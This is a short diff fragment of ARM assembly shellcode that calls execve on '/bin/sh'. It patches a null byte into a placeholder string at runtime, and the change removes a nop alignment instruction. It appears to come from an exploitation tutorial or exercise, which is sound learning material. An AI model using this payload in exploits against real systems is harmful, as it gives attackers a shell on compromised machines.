@@ -22,6 +22,5 @@ _start:
     strb   r2, [r0, #7]   // add null terminator
     mov    r7, #11        // r7 = execve
     svc    1
-    nop                   // align by 4 bytes
 sh:    
 .ascii "/bin/shX"
